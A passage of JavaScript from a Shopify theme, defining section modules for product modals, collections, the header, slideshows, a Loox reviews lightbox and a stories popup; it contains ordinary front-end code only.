                    var url = $formHolder.data('url');
                    url = url + '?view=ajax';

                    $formHolder.load(url + ' #AddToCartForm-' + this.sectionId, function() {
                        $formHolder.addClass('is-active');
                        this.formSetup();
                        if (Shopify.PaymentButton) {
                            Shopify.PaymentButton.init();
                        }
                    }.bind(this));

                    this.productSetup();
                    this.loadModalContent();
                    this.createImageCarousels();
                    this.settings.modalInit = true;
                }

                this.resizeSlides();

                // Add product id to recently viewed array
                this.addIdToRecentlyViewed();
            },

            closeModalProduct: function() {
                this.stopYoutubeVideo();
                this.stopVimeoVideo();
                this.stopMp4Video();
            },

            loadModalContent: function() {
                // Load videos if they exist
                var videoTypes = this.checkIfVideos();

                // Lazyload mp4 videos similar to images
                if (videoTypes && videoTypes.indexOf('mp4') > -1) {
                    this.$modal.find('.product__video[data-video-type="mp4"]').each(function(i, video) {
                        var $el = $(video);
                        var src = $el.data('video-src');
                        var source = document.createElement('source');
                        source.setAttribute('src', src);
                        $el.append(source);
                    }.bind(this));
                }
            },

            onUnload: function() {
                this.$container.off(this.settings.namespace);
                $('body').off(this.settings.namespace);
                this.destroyImageCarousels();
            }
        });

        return Product;
    })();

    theme.CollectionHeader = (function() {

        var selectors = {
            hero: '.collection-hero',
            parallaxContainer: '.parallax-container'
        };

        function CollectionHeader(container) {
            var $container = $(container);
            this.namespace = '.collection-header';

            var $heroImageContainer = $container.find(selectors.hero);
            if ($heroImageContainer.length) {
                if ($container.data('parallax')) {
                    var $parallaxContainer = $container.find(selectors.parallaxContainer);
                    var args = {
                        namespace: this.namespace
                    };
                    theme.parallaxSections[this.namespace] = new theme.Parallax($parallaxContainer, args);
                }
            }
        }

        CollectionHeader.prototype = $.extend({}, CollectionHeader.prototype, {
            onUnload: function() {
                theme.parallaxSections[this.namespace].destroy();
                delete theme.parallaxSections[this.namespace];
            }
        });

        return CollectionHeader;
    })();

    theme.CollectionSidebar = (function() {
        var drawerStyle = false;

        function CollectionSidebar(container) {
            this.$container = $(container);
            this.init();
        }

        CollectionSidebar.prototype = $.extend({}, CollectionSidebar.prototype, {
            init: function() {
                // Force close the drawer if it exists
                this.onUnload();

                drawerStyle = this.$container.data('style') === 'drawer';
                theme.FilterDrawer = new theme.Drawers('FilterDrawer', 'collection-filters', true);
            },

            forceReload: function() {
                this.init();
            },

            onSelect: function() {
                if (theme.FilterDrawer) {
                    if (!drawerStyle) {
                        theme.FilterDrawer.close();
                        return;
                    }

                    if (drawerStyle || theme.config.bpSmall) {
                        theme.FilterDrawer.open();
                    }
                }
            },

            onDeselect: function() {
                if (theme.FilterDrawer) {
                    theme.FilterDrawer.close();
                }
            },

            onUnload: function() {
                if (theme.FilterDrawer) {
                    theme.FilterDrawer.close();
                }
            }
        });

        return CollectionSidebar;
    })();

    theme.Collection = (function() {

        var selectors = {
            colorSwatchImage: '.grid-product__color-image',
            colorSwatch: '.color-swatch--with-image'
        };

        function Collection(container) {
            this.container = container;
            this.sectionId = $(container).attr('data-section-id');
            this.namespace = '.collection-' + this.sectionId;

            this.init();
        }

        Collection.prototype = $.extend({}, Collection.prototype, {
            init: function() {
                // init is called on load and when tags are selected
                this.$container = $(this.container);
                var sectionId = this.sectionId = this.$container.attr('data-section-id');
                this.namespace = '.collection-' + sectionId;

                this.sortBy();
                this.colorSwatchHovering();

                theme.reinitSection('collection-sidebar');
            },

            sortBy: function() {
                var $sortBy = $('#SortBy');

                if (!$sortBy.length) {
                    return;
                }

                $sortBy.on('change' + this.namespace, function() {
                    location.href = '?sort_by=' + $(this).val();
                });
            },

            colorSwatchHovering: function() {
                var $colorImage = $(selectors.colorSwatchImage);
                if (!$colorImage.length) {
                    return;
                }

                var $swatches = this.$container.find(selectors.colorSwatch);

                $swatches.on({
                    mouseenter: function(evt) {
                        $el = $(evt.currentTarget);
                        var id = $el.data('variant-id');
                        var image = $el.data('variant-image');
                        $('.grid-product__color-image--' + id)
                            .css('background-image', 'url(' + image + ')')
                            .addClass('is-active');
                    },
                    mouseleave: function(evt) {
                        $el = $(evt.currentTarget);
                        var id = $el.data('variant-id');
                        $('.grid-product__color-image--' + id).removeClass('is-active');
                    }
                });
            },

            forceReload: function() {
                this.onUnload();
                this.init();
            },

            onUnload: function() {
                $(window).off(this.namespace);
                this.$container.off(this.namespace);
                $(selectors.colorSwatch).off(this.namespace);
            }
        });

        return Collection;
    })();

    theme.HeaderSection = (function() {

        var selectors = {
            drawer: '#NavDrawer',
            mobileSubNavToggle: '.mobile-nav__toggle-btn',
            hasSublist: '.mobile-nav__has-sublist'
        };

        var classes = {
            navExpanded: 'mobile-nav--expanded'
        };

        function Header(container) {
            var $container = this.$container = $(container);
            var sectionId = this.sectionId = $container.attr('data-section-id');

            // Reload any slideshow if when the header is reloaded to make sure the
            // sticky header works as expected
            theme.reinitSection('slideshow-section');

            theme.currencySwitcher.init()
            this.initDrawers();
            theme.headerNav.init();
            theme.announcementBar.init();

            // if sticky hide 
            var headerEl = this.$container[0].querySelector('header');
            if (headerEl.classList.contains('sticky_hide')) {
                var prevScrollpos = window.pageYOffset;
                window.onscroll = function() {
                    var currentScrollPos = window.pageYOffset;
                    if (prevScrollpos > currentScrollPos) {
                        headerEl.classList.remove('hidescroll');
                    } else {
                        headerEl.classList.add('hidescroll');
                    }
                    prevScrollpos = currentScrollPos;
                }
            }



            // Set a timer to resize the header in case the logo changes size
            if (Shopify.designMode) {
                setTimeout(function() {
                    $('body').trigger('resize');
                }, 500);
            }


        }

        Header.prototype = $.extend({}, Header.prototype, {
            initDrawers: function() {
                theme.NavDrawer = new theme.Drawers('NavDrawer', 'nav');
                if (theme.settings.cartType === 'drawer') {
                    new theme.CartDrawer();
                }

                this.drawerMenuButtons();
            },

            drawerMenuButtons: function() {
                $(selectors.drawer).find('.js-drawer-close').on('click', function(evt) {
                    evt.preventDefault();
                    theme.NavDrawer.close();
                });

                var $mobileSubNavToggle = $(selectors.mobileSubNavToggle);

                $mobileSubNavToggle.attr('aria-expanded', 'false');
                $mobileSubNavToggle.each(function(i, el) {
                    var $el = $(el);
                    $el.attr('aria-controls', $el.attr('data-aria-controls'));
                });

                $mobileSubNavToggle.on('click', function() {
                    var $el = $(this);
                    var currentlyExpanded = $el.attr('aria-expanded');
                    var toggleState = false;

                    // Updated aria-expanded value based on state pre-click
                    if (currentlyExpanded === 'true') {
                        $el.attr('aria-expanded', 'false');
                    } else {
                        $el.attr('aria-expanded', 'true');
                        toggleState = true;
                    }

                    // Toggle class that expands/collapses sublist
                    $el.closest(selectors.hasSublist).toggleClass(classes.navExpanded, toggleState);
                });
            },

            onBlockSelect: function(evt) {
                theme.announcementBar.onBlockSelect(evt.detail.blockId);
            },

            onDeselect: function() {
                theme.announcementBar.onBlockDeselect();
            },

            onUnload: function() {
                theme.NavDrawer.close();
                theme.headerNav.unload();
                theme.announcementBar.unload();
            }
        });

        return Header;

    })();

    theme.FeaturedContentSection = (function() {

        function FeaturedContent() {
            $('.rte').find('a:not(:has(img))').addClass('text-link');
        }

        return FeaturedContent;
    })();

    theme.slideshows = {};

    theme.SlideshowSection = (function() {

        var selectors = {
            parallaxContainer: '.parallax-container'
        };

        function SlideshowSection(container) {
            var $container = this.$container = $(container);
            var $section = $container.parent();
            var sectionId = $container.attr('data-section-id');
            var slideshow = this.slideshow = '#Slideshow-' + sectionId;
            this.namespace = '.' + sectionId;

            var $imageContainer = $(container).find('.hero');
            if ($imageContainer.length) {
                theme.loadImageSection($imageContainer);
            }

            this.init();

            if ($container.data('parallax')) {
                var args = {
                    namespace: this.namespace
                };
                theme.parallaxSections[this.namespace] = new theme.Parallax($container.find(selectors.parallaxContainer), args);
            }
        }

        SlideshowSection.prototype = $.extend({}, SlideshowSection.prototype, {
            init: function() {
                // Prevent slideshows from initializing on top of themselves
                this.onUnload();

                var $slideshow = $(this.slideshow);
                var args = {
                    autoplay: $slideshow.data('autoplay'),
                    arrows: $slideshow.data('arrows'),
                    dots: $slideshow.data('dots'),
                    fade: true,
                    speed: 500 // same as $slideshowImageAnimationSpeed in CSS
                };

                theme.slideshows[this.slideshow] = new theme.Slideshow(this.slideshow, args);
            },

            forceReload: function() {
                this.init();
            },

            onUnload: function() {
                if (theme.parallaxSections[this.namespace]) {
                    theme.parallaxSections[this.namespace].destroy();
                    delete theme.parallaxSections[this.namespace];
                }
                if (theme.slideshows[this.slideshow]) {
                    theme.slideshows[this.slideshow].destroy();
                    delete theme.slideshows[this.slideshow];
                }
            },

            onSelect: function() {
                $(this.slideshow).slick('slickPause');
            },

            onDeselect: function() {
                $(this.slideshow).slick('slickPlay');
            },

            onBlockSelect: function(evt) {
                var $slideshow = $(this.slideshow);

                // Ignore the cloned version
                var $slide = $('.slideshow__slide--' + evt.detail.blockId + ':not(.slick-cloned)');
                var slideIndex = $slide.data('slick-index');

                // Go to selected slide, pause autoplay
                $slideshow.slick('slickGoTo', slideIndex).slick('slickPause');
            },

            onBlockDeselect: function() {
                $(this.slideshow).slick('slickPlay');
            }
        });

        return SlideshowSection;
    })();
  
  
    theme.loaders = {};

    theme.LoaderSection = (function() {
      function LoaderSection(container) {
        var $container = this.$container = $(container);
        var $section = $container.parent();
        var sectionId = $container.attr('data-section-id');
        var loader_init = this.loader_init = $container.attr('data-init');
        this.init();
      }
      LoaderSection.prototype = $.extend({}, LoaderSection.prototype, {
        init: function() {
          if ( typeof(window[this.loader_init]) !== 'undefined' ) window[this.loader_init]();

          
var svgEl = $(this.$container).find('svg')[0];  
          if(svgEl && svgEl.classList.contains('trace')) {          
console.log(svgEl);          
svgEl.classList.add('start');
console.log(svgEl);
  
// Overwriting defaults
var svg = new Walkway({
  selector: '#shopify-section-Loader svg',
  duration: '2000',
  // can pass in a function or a string like 'easeOutQuint'
  easing: function (t) {
    return t * t;
  }
});

svg.draw(function() {
  svgEl.classList.add('fill');
    window.draw = true; 
});  
  
          }
        }
      });
	  //
      return LoaderSection;
    })();
  
  
  
    theme.revsliders = {};

    theme.RevSliderSection = (function() {
      function RevSliderSection(container) {
        var $container = this.$container = $(container);
        var $section = $container.parent();
        var sectionId = $container.attr('data-section-id');
        var slideshow_init = this.slideshow_init = $container.attr('data-init');
        this.init();
      }
      RevSliderSection.prototype = $.extend({}, RevSliderSection.prototype, {
        init: function() {
          if ( typeof(window[this.slideshow_init]) !== 'undefined' ) window[this.slideshow_init]();
          //console.log(this.slideshow_init);
        }
      });
	  //
      return RevSliderSection;
    })();
  
  
  
  
       theme.looxreviews = {};

    theme.LooxReviewsSection = (function() {
      function LooxReviewsSection(container) {
        var $container = this.$container = $(container);
        var $section = $container.parent();
        var sectionId = $container.attr('data-section-id');
        var slideshow_init = this.slideshow_init = $container.attr('data-init');
        this.init();
      }
      LooxReviewsSection.prototype = $.extend({}, LooxReviewsSection.prototype, {
        init: function() {
          if ( typeof(window[this.slideshow_init]) !== 'undefined' ) window[this.slideshow_init]();    
          var thegrid =  $(this.$container).find('.grid-loox');
          thegrid.masonry({
           itemSelector: '.grid-item-wrap'
          });       
          var buttons = this.$container[0].querySelectorAll('[data-panel]'),
          chevronClose = this.$container[0].querySelector('.chevron-closed'),
          chevronOpen = this.$container[0].querySelector('.chevron-open');
          [].forEach.call(buttons, function(button) {   
            var target =  button.closest('.header-loox').querySelector('#' + (button.getAttribute('data-panel').toString()));
            button.addEventListener('click', function(e) {
              e.preventDefault();
              e.stopPropagation()
              if(target.style.display !== 'none') {
              target.style.display = 'none';
              if(target.id == 'reviews-dist') {
              chevronOpen.style.display= 'block';
              chevronClose.style.display= 'none';
              }
              if (window.innerWidth > 617) {  
              document.removeEventListener('click', outsideClickListener);  
              }
              }else{
              target.style.display = 'block';
              if(target.id == 'reviews-dist') {  
              chevronOpen.style.display= 'none';
              chevronClose.style.display= 'block';
              }
              if (window.innerWidth > 617) {    
              document.addEventListener('click', outsideClickListener);
              }
              }
            });
          });
          function outsideClickListener() {
              var panels = thegrid[0].parentElement.querySelectorAll('.loox-dropdown');         
              [].forEach.call(panels, function(panel) {   
                panel.style.display = 'none';
              	chevronOpen.style.display= 'block';
              	chevronClose.style.display= 'none'; 
              });
              document.removeEventListener('click', outsideClickListener);  
          }
           var actions = this.$container[0].querySelectorAll('.action');
            [].forEach.call(actions, function(action) { 
              action.addEventListener('click', createLightbox)
            });
          function createLightbox(e) {
           var gridItem = e.currentTarget.closest('.grid-item'),
           looxTemp = document.createElement('div');
           looxTemp.id = 'looxOverlay_quickview';
           looxTemp.classList.add('loox-overlay'); 
const review = {
    name: gridItem.getAttribute('data-name'),
    date: gridItem.getAttribute('data-date'),
    rating: gridItem.getAttribute('data-rating'),
    review: gridItem.getAttribute('data-review'),
    image: gridItem.getAttribute('data-img'),
    productTitle: gridItem.getAttribute('data-product-title'),
    productImg: gridItem.getAttribute('data-product-img'),
    productUrl: gridItem.getAttribute('data-product-url')
}
// And then create our markup:
const markup = `
    <div id="loox_quickview">
<div class="grid-item-wrap has-img">
   <div class="grid-item clearfix">
      <div style="background: rgb(151,136,107)" class="item-img"><img src="${review.image}" alt="${review.name} review of ${review.productTitle}" data-img-ratio="1.33" onerror="this.parentElement.removeChild(this)" onload="this.classList.add('fadeIn'); this.loaded = true;" class="portrait"></div>
      <div class="main">
         <div class="review-details">
            <div class="spread-container">
               <div class="normal-text title">${review.name}</div>
               <div style="display:flex;align-items:center;">
                  <div class="time verified-i" data-upgraded="true">${review.date}</div>
                  <svg id="i-icon" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M7.99992 14.6666C4.31792 14.6666 1.33325 11.682 1.33325 7.99998C1.33325 4.31798 4.31792 1.33331 7.99992 1.33331C11.6819 1.33331 14.6666 4.31798 14.6666 7.99998C14.6666 11.682 11.6819 14.6666 7.99992 14.6666ZM7.99992 13.3333C9.41441 13.3333 10.771 12.7714 11.7712 11.7712C12.7713 10.771 13.3333 9.41447 13.3333 7.99998C13.3333 6.58549 12.7713 5.22894 11.7712 4.22874C10.771 3.22855 9.41441 2.66665 7.99992 2.66665C6.58543 2.66665 5.22888 3.22855 4.22868 4.22874C3.22849 5.22894 2.66659 6.58549 2.66659 7.99998C2.66659 9.41447 3.22849 10.771 4.22868 11.7712C5.22888 12.7714 6.58543 13.3333 7.99992 13.3333ZM7.33325 4.66665H8.66659V5.99998H7.33325V4.66665ZM7.33325 7.33331H8.66659V11.3333H7.33325V7.33331Z" fill="black" fill-opacity="0.4"></path>
                  </svg>
                  <div data-element="notification-text" class="i-verified-notification"><span data-element="notification-text">This review was collected from a verified customer who purchased this item.</span></div>
               </div>
            </div>
            <div class="spread-container">
               <div class="stars">
                      <span class="star" data-origin="star" data-color="#FFDC00" data-star="2" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1728 647q0 22-26 48l-363 354 86 500q1 7 1 20 0 21-10.5 35.5t-30.5 14.5q-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>
${review.rating < 2 ? `<span class="star" data-origin="star_o" data-color="#ccc" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1201 1004l306-297-422-62-189-382-189 382-422 62 306 297-73 421 378-199 377 199zm527-357q0 22-26 48l-363 354 86 500q1 7 1 20 0 50-41 50-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>` : '<span class="star" data-origin="star" data-color="#FFDC00" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1728 647q0 22-26 48l-363 354 86 500q1 7 1 20 0 21-10.5 35.5t-30.5 14.5q-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>'}                      
${review.rating < 3 ? `<span class="star" data-origin="star_o" data-color="#ccc" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1201 1004l306-297-422-62-189-382-189 382-422 62 306 297-73 421 378-199 377 199zm527-357q0 22-26 48l-363 354 86 500q1 7 1 20 0 50-41 50-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>` : '<span class="star" data-origin="star" data-color="#FFDC00" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1728 647q0 22-26 48l-363 354 86 500q1 7 1 20 0 21-10.5 35.5t-30.5 14.5q-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>'}                      
${review.rating < 4 ? `<span class="star" data-origin="star_o" data-color="#ccc" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1201 1004l306-297-422-62-189-382-189 382-422 62 306 297-73 421 378-199 377 199zm527-357q0 22-26 48l-363 354 86 500q1 7 1 20 0 50-41 50-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>` : '<span class="star" data-origin="star" data-color="#FFDC00" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1728 647q0 22-26 48l-363 354 86 500q1 7 1 20 0 21-10.5 35.5t-30.5 14.5q-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>'}                      
${review.rating < 5 ? `<span class="star" data-origin="star_o" data-color="#ccc" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1201 1004l306-297-422-62-189-382-189 382-422 62 306 297-73 421 378-199 377 199zm527-357q0 22-26 48l-363 354 86 500q1 7 1 20 0 50-41 50-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>` : '<span class="star" data-origin="star" data-color="#FFDC00" data-star="5" style="display:inline-block;vertical-align:middle;cursor:pointer;"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="14" height="14" viewBox="0 0 1792 1792"><path d="M1728 647q0 22-26 48l-363 354 86 500q1 7 1 20 0 21-10.5 35.5t-30.5 14.5q-19 0-40-12l-449-236-449 236q-22 12-40 12-21 0-31.5-14.5t-10.5-35.5q0-6 2-20l86-500-364-354q-25-27-25-48 0-37 56-46l502-73 225-455q19-41 49-41t49 41l225 455 502 73q56 9 56 46z" fill="#000000"></path></svg></span>'}
               </div>
               <div class="verified-purchase-container"><i class="fa verified-purchase-icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="check-circle" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-check-circle fa-w-16 fa-3x"><path fill="currentColor" d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z" class=""></path></svg></i><span class="small-text">Verified purchase</span></div>
            </div>
         </div>
         <div class="review-content-wrapper">
            <div class="review-content">
               <div class="pre-wrap normal-text">${review.review}</div>
            </div>
         </div>
         <div class="go-to-product-card-wrapper">
            <hr class="divider">
            <div class="go-to-product-card">
               <div class="product-img"><img src="${review.productImg}" onerror="this.parentNode.removeChild(this);"></div>
               <div class="product-details">
                  <div class="product-title">${review.productTitle}</div>
                  <a href="${review.productUrl}" title="View product at store" target="_blank" rel="nofollow noopener noreferrer" class="icon-button">
                     <div class="button-icon">
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M4.66667 5.33335V4.00002C4.66667 3.11597 5.01786 2.26812 5.64298 1.643C6.2681 1.01788 7.11595 0.666687 8 0.666687C8.88406 0.666687 9.7319 1.01788 10.357 1.643C10.9821 2.26812 11.3333 3.11597 11.3333 4.00002V5.33335H13.3333C13.5101 5.33335 13.6797 5.40359 13.8047 5.52862C13.9298 5.65364 14 5.82321 14 6.00002V14C14 14.1768 13.9298 14.3464 13.8047 14.4714C13.6797 14.5964 13.5101 14.6667 13.3333 14.6667H2.66667C2.48986 14.6667 2.32029 14.5964 2.19526 14.4714C2.07024 14.3464 2 14.1768 2 14V6.00002C2 5.82321 2.07024 5.65364 2.19526 5.52862C2.32029 5.40359 2.48986 5.33335 2.66667 5.33335H4.66667ZM4.66667 6.66669H3.33333V13.3334H12.6667V6.66669H11.3333V8.00002H10V6.66669H6V8.00002H4.66667V6.66669ZM6 5.33335H10V4.00002C10 3.46959 9.78929 2.96088 9.41421 2.58581C9.03914 2.21073 8.53043 2.00002 8 2.00002C7.46957 2.00002 6.96086 2.21073 6.58579 2.58581C6.21071 2.96088 6 3.46959 6 4.00002V5.33335Z" fill="black"></path>
                        </svg>
                     </div>
                     <span class="button-text">View product</span>
                  </a>
               </div>
            </div>
         </div>
         <div id="close-btn" class="close-btn">
            <div class="close-button-icon">
               <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 10.5862L16.95 5.63623L18.364 7.05023L13.414 12.0002L18.364 16.9502L16.95 18.3642L12 13.4142L7.04999 18.3642L5.63599 16.9502L10.586 12.0002L5.63599 7.05023L7.04999 5.63623L12 10.5862Z" fill="white"></path>
               </svg>
            </div>
         </div>
      </div>
   </div>
</div>
    </div>
`;
           looxTemp.innerHTML = markup;
          // document.body.append(looxTemp);
           var icon = looxTemp.querySelector('#i-icon'),
           notif = looxTemp.querySelector('.i-verified-notification'),
           closeBtn = looxTemp.querySelector('#close-btn');
            icon.addEventListener('click', function(e) {
              e.preventDefault();
              e.stopPropagation()
              if(notif.classList.contains('notif-open')) {
                notif.classList.remove('notif-open');
              }else{
               notif.classList.add('notif-open');
              }
            });
            document.body.style.overflow = 'hidden';
            document.body.append(looxTemp);
            setTimeout(function() {
            closeBtn.addEventListener('click', closeLightbox);
            document.addEventListener('click', closeLightbox);
            },0);
          }
         function closeLightbox(e) {
          var container = document.getElementById('loox_quickview');

          if (e.target.closest('#close-btn') || !container.contains(e.target)) {
            if(window.innerWidth > 617) {
           container.classList.add('out');
           "webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend".split(" ").map(animEndEventName => container.addEventListener(animEndEventName, removeLooxOverlay));  
            }else{
             removeLooxOverlay();
            }
            document.body.style = 'block';
           
          }  
         }
          function removeLooxOverlay(e) {
          if(window.innerWidth > 617) {  
          "webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend".split(" ").map(animEndEventName => e.currentTarget.removeEventListener(animEndEventName, removeLooxOverlay));  
          }
          var containerWrap = document.getElementById('looxOverlay_quickview');  
          containerWrap.remove();
          document.removeEventListener('click', closeLightbox);
          }
        }
      });
	  //
      return LooxReviewsSection;
    })();
  
  
    theme.stories = {};

    theme.StoriesSection = (function() {
      function StoriesSection(container) {
        var $container = this.$container = $(container);
        var $section = $container.parent();
        var sectionId = $container.attr('data-section-id');
        var stories_init = this.slideshow_init = $container.attr('data-init');
        this.init();
      }
      StoriesSection.prototype = $.extend({}, StoriesSection.prototype, {
        init: function() {
          if ( typeof(window[this.stories_init]) !== 'undefined' ) window[this.stories_init]();    
          let popup = addPopup();
          let mySwiper = create_swiper();
          setup_swiper_rules(mySwiper);
          createStories();
          
          
          function createStories() {
          
    function addEventListenerList(list, event, fn) {
    for (var i = 0, len = list.length; i < len; i++) {
        list[i].addEventListener(event, fn, false);
    }
    }
          
    var stories = document.querySelectorAll('.story.video, .story.image');    
    addEventListenerList(stories, 'click', handleStories);       
          
  function handleStories(event) {
  var currentStoryEl = event.currentTarget;
  var $this = $(currentStoryEl);
  // its loading add the fader
  currentStoryEl.classList.add('fade');
  var isvideo = currentStoryEl.classList.contains('video');
  var isimage = currentStoryEl.classList.contains('image');   
  // get storyEl original position to launch popup window from
  var storywidth = currentStoryEl.querySelector('.gradient').offsetWidth / 2;
  var storyheight = currentStoryEl.querySelector('.gradient').offsetHeight / 2;
  // calculations i forgot what i did exactly 
    if (getCoords(currentStoryEl).left < getViewport()[0] / 2) {
			var toRight = false;
			var width = getViewport()[0] / 2 - getCoords(currentStoryEl).left;
			var width = width - storywidth;
		} else {
			var toRight = true;
			var width = getCoords(currentStoryEl).left - getViewport()[0] / 2;
			var width = width + storywidth;
	}
   // setting important variables
  		var height = getViewport()[1] / 2 - getCoords(currentStoryEl).top;
		var height = height - storyheight;
    
		var popupEl = document.querySelector('#popup');  
    
    // throw popup into position
		if (!toRight) {    
          popupEl.style.cssText = "transform:-" + width + "px,-" + height + "px) scale(0.1); opacity:0;";
		} else {
          popupEl.style.cssText = "transform:" + width + "px,-" + height + "px) scale(0.1); opacity:0;";
		}
        popupEl.classList.add('active');
    
    
    	//get bubble stuff
		var bubbleImage = currentStoryEl.querySelector('.img');
		var bubbleImageBackground = getComputedStyle(bubbleImage).backgroundImage;
		var bubbleImagePosition = getComputedStyle(bubbleImage).backgroundPosition;
		var bubbleTitle = currentStoryEl.querySelector('.title').innerHTML;
		var storyprofile = popupEl.querySelector('.story-profile');
		//place bubble stuff
		var storyProfileImage = storyprofile.querySelector('.story-profile-pic div');
		storyProfileImage.style.backgroundImage = bubbleImageBackground;
		storyProfileImage.style.backgroundPosition = bubbleImagePosition;
		var storyProfileContent = storyprofile.querySelector('.story-profile-content');
		storyProfileContent.innerHTML = bubbleTitle;
    
    
    		// create array of media files
			var mediaArrayJoin = currentStoryEl.getAttribute('media').split('|').filter(function (el) {
				return el != '';
			});
			// convert array to object
			var mediaArray = [];
			mediaArrayJoin.forEach(function (value, index) {
               
				var mediaSingleArray = value.split('::').filter(function (el) {
					return el != '';
				})
				var mediaObject = {};
				$.each(mediaSingleArray, function (index, value) {
					if (index == 0) {
						mediaObject['media'] = value;
					} else {
						mediaObject['swipe'] = value;
					}
				});
				mediaArray.push(mediaObject);
			});


    
        // create slides
		var slides = '';
		mediaArray.forEach(function (value, index) {
         slides += '<div class="swiper-slide'+ (value.swipe ? ' swipe' : '') +'" '+ (value.swipe ? ' swipe="'+ value.swipe +'"' : '') +'>'+ (isvideo ? '<video id="media-'+ index +'" preload="auto" playsinline=""><source src="' : '<img id="media-'+ index +'" src="') + value.media + (isvideo ? '" type="video/mp4"></video>' : '" />') + '</div>';
		});

    	// create progress bars
		var count = mediaArray.length;
		var progressbars = '';
		for (var i = 0; i < count; i++) {
			progressbars += '<div id="progress-bar-' + i + '" class="progress-backround"><div class="progressbar"></div></div>';
		}
      
        popupEl.querySelector('.swiper-wrapper').innerHTML = slides;
		popupEl.querySelector('#progress-bars-wrap').innerHTML = progressbars;
		window.storyactive = true;
		// update swiper start at 0 
		var mySwiper = popupEl.querySelector('.swiper-container').swiper;
		mySwiper.update();
		mySwiper.slideTo(0);
    
 if (isvideo) {

			jQuery('#popup').find('video').each(function (index, ev) {

				//open popup and remove fade 
				if (index == 0) {
					$(this).on('canplay', function () {
						currentStoryEl.classList.remove('fade');
						$('#popup').addClass('transition');
					})
				}


				this.oncanplay = (event) => {
					var promise = this.play();
					if (promise !== undefined) {
						promise.then(_ => {
							// Autoplay started!
							if (index !== 0) {
								this.pause();
							} else {
								//  alert('played');
							}
						}).catch(error => {
							// Autoplay was prevented.
							// Show a "Play" button so that user can start playback.
							// alert(error);
						});
					}
				}

			});

			// play first video
			var firstvideo = document.querySelector('#popup video');
			playvideo(firstvideo, mySwiper);

			jQuery('#popup').find('video').each(function (index, value) {
				if (index == 0) {
					var videoEl = $(this).get(0);
					videoEl.addEventListener('timeupdate', updateProgress, false);
					videoEl.play();
				}
			});

		} else if (isimage) {
			// play first video
			convertimagestomp4(mySwiper);
